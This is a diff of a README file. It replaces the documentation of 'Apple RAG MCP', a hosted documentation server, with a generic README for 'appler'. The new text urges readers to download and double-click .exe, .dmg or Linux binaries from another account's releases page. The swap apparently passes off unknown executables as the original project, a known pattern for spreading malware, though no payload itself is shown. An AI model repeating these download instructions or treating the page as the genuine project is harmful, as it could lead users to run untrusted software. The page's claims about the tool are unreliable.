@@ -1,131 +1,61 @@
-<div align="center">
+# 🍏 appler - Access Apple Docs with Ease
 
-<img src="https://apple-rag.com/logo-with-text.svg" alt="Apple RAG MCP" width="400">
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/adamgreft/appler/releases)
 
-*Transform your AI agents into Apple development experts with instant access to official Swift docs, design guidelines, and platform knowledge.*
+## 🚀 Getting Started
+Welcome to the appler application! This tool helps users access Apple developer documentation quickly and conveniently using advanced AI technology. Whether you're developing apps or just exploring, appler streamlines your experience.
 
-[![Install MCP Server](https://cursor.com/deeplink/mcp-install-light.svg)](https://cursor.com/en/install-mcp?name=apple-rag-mcp&config=eyJ1cmwiOiJodHRwczovL21jcC5hcHBsZS1yYWcuY29tIn0%3D)
+### 📋 System Requirements
+To run appler, you will need:
+- A computer running Windows, macOS, or Linux.
+- At least 1 GB of RAM.
+- A stable internet connection.
+- A modern web browser (e.g., Chrome, Firefox, Safari).
 
-[🌐 Learn More](https://apple-rag.com) • [🚀 Get Started](https://apple-rag.com/register) • [📊 Dashboard](https://apple-rag.com/overview)
+## 💾 Download & Install
+To get started, visit this page to download: [Download appler](https://github.com/adamgreft/appler/releases).
 
-</div>
+1. Click the link above to go to the Releases page.
+2. Find the latest version of appler.
+3. Click on the version number to view the release details.
+4. Look for the file appropriate for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux).
+5. Download the file by clicking on it.
+6. Once the download is complete, locate the file on your computer.
 
-## ✨ What is Apple RAG MCP?
+### 🛠️ Installation Steps
+1. **For Windows:**
+   - Locate the `.exe` file in your Downloads folder.
+   - Double-click the file to start the installation.
+   - Follow the on-screen instructions to complete the installation.
 
-Apple RAG MCP delivers exactly what your AI agents need: **official Swift development docs, design guidelines, comprehensive Apple platform knowledge, and Apple Developer YouTube content** including WWDC sessions, tutorials, and live events - current and complete.
+2. **For macOS:**
+   - Locate the `.dmg` file in your Downloads folder.
+   - Double-click the file to open it.
+   - Drag the appler icon to your Applications folder.
+   - Eject the disk image after installation.
 
-A cutting-edge **Retrieval-Augmented Generation (RAG) system** combining Apple's official documentation with video content from the Apple Developer YouTube channel. Features **professional AI reranking** with Qwen3-Reranker-8B for superior search accuracy across multiple content types.
+3. **For Linux:**
+   - Extract the compressed file to a desired location.
+   - Open a terminal and navigate to the extracted folder.
+   - Run the application using the terminal with the command `./appler`.
 
-**🤖 AI-Powered Embedding & Reranking** • **⚡ Semantic Search for RAG** • **🔍 Keyword Search** • **🎯 Hybrid Search**
+## 🌟 Features
+- **Instant Access:** Quickly retrieve documentation for various Apple developer tools.
+- **AI-Powered:** Intelligent searches help you find the right information faster.
+- **User-Friendly Interface:** A simple layout makes it easy for anyone to use.
 
-## 🚀 Quick Start
+## 🛠️ Usage
+After installation:
+1. Open the appler application.
+2. Use the search bar to enter keywords related to the Apple documentation you need.
+3. Review the results and click on a link to open the documentation in your web browser.
 
-### Option 1: One-Click Cursor Setup (Recommended)
+## 🎓 Support
+If you have questions or need assistance, you can visit the [GitHub Issues page](https://github.com/adamgreft/appler/issues) to report problems or ask for help. We monitor this area and will respond to your inquiries.
 
-[![Install MCP Server](https://cursor.com/deeplink/mcp-install-light.svg)](https://cursor.com/en/install-mcp?name=apple-rag-mcp&config=eyJ1cmwiOiJodHRwczovL21jcC5hcHBsZS1yYWcuY29tIn0%3D)
+## 🔗 Useful Links
+- [Releases Page](https://github.com/adamgreft/appler/releases)
+- [GitHub Issues](https://github.com/adamgreft/appler/issues)
 
-Click the button above and Cursor will automatically configure everything for you in seconds.
-
-### Option 2: Manual Setup for Other MCP Clients
-
-**JSON Configuration (Copy & Paste):**
-```json
-{
-  "mcpServers": {
-    "apple-rag-mcp": {
-      "url": "https://mcp.apple-rag.com"
-    }
-  }
-}
-```
-
-**Manual Configuration Parameters:**
-- **MCP Type:** `Streamable HTTP`
-- **URL:** `https://mcp.apple-rag.com`
-- **Authentication:** `Optional` (MCP Token for higher limits)
-- **MCP Token:** Get yours at [apple-rag.com](https://apple-rag.com) for increased quota
-
-### Option 3: Self-Hosted Deployment
-
-Want to run your own instance? See our [Deployment Guide](DEPLOYMENT.md) for complete setup instructions.
-
-**Quick Setup:**
-```bash
-# Clone and setup
-git clone https://github.com/your-org/apple-rag-mcp.git
-cd apple-rag-mcp
-pnpm install
-
-# Configure environment
-cp .dev.vars.example .dev.vars
-# Edit .dev.vars with your configuration
-
-# Deploy to Cloudflare Workers
-pnpm setup-secrets
-pnpm deploy
-```
-
-**Supported Clients:** Cursor, Claude Desktop, Cline, and all MCP-compatible tools.
-
-> **Note:** No MCP Token required to start! You get free queries without any authentication. Add an MCP Token later for higher usage limits.
-
-## 🌟 Why Developers Love Apple RAG MCP
-
-<table>
-<tr>
-<td width="50%">
-
-### ⚡ **Fast & Reliable**
-Get quick responses with our optimized search infrastructure. No more hunting through docs.
-
-### 🎯 **AI-Powered Hybrid Search**
-Advanced search technology combining Semantic Search for RAG, Keyword Search, and Hybrid Search with vector similarity and technical term matching provides accurate, contextual answers from Apple's documentation.
-
-### 🔒 **Always Secure**
-MCP authentication ensures trusted access for your AI agents with enterprise-grade security.
-
-</td>
-<td width="50%">
-
-### 📝 **Code Examples**
-Get practical code examples in Swift, Objective-C, and SwiftUI alongside documentation references.
-
-### 🔄 **Real-time Updates**
-Our documentation index is continuously updated to reflect the latest Apple developer resources.
-
-### 🆓 **Completely Free**
-Start immediately with no MCP Token required. Get an MCP Token for higher usage limits - all managed at [apple-rag.com](https://apple-rag.com).
-
-</td>
-</tr>
-</table>
-
-## 🎯 Features
-
-- **🔍 Semantic Search for RAG** - Vector similarity with semantic understanding for intelligent retrieval
-- **🔎 Keyword Search** - Precise technical term matching for API names and specific terminology
-- **🎯 Hybrid Search** - Combined semantic and keyword search with AI reranking for optimal results
-- **📚 Complete Coverage** - iOS, macOS, watchOS, tvOS, visionOS documentation
-- **📺 Video Content** - Apple Developer YouTube channel with WWDC sessions and tutorials
-- **⚡ Fast Response** - Optimized for speed across all content types
-- **🚀 High Performance** - Multi-instance cluster deployment for maximum throughput
-- **🔄 Always Current** - Synced with Apple's latest docs and video content
-- **🛡️ Secure & Private** - Your queries stay private
-- **🌐 Universal MCP** - Works with any MCP-compatible client
-
-## 🤝 Community & Support
-
-- **🌐 Dashboard:** [apple-rag.com](https://apple-rag.com)
-- **📖 Documentation:** Complete setup guides and examples
-- **💬 Support:** Get help through our web dashboard
-- **⭐ GitHub:** Star this repo if you find it useful!
-
-<div align="center">
-
-**Ready to supercharge your AI agents with Apple expertise?**
-
-[🚀 Get Started Now](https://apple-rag.com) • [⭐ Star on GitHub](https://github.com/BingoWon/apple-rag-mcp)
-
-*Made with ❤️ for the Apple developer community*
-
-</div>
+Thank you for using appler! We hope this tool enhances your Apple development experience.
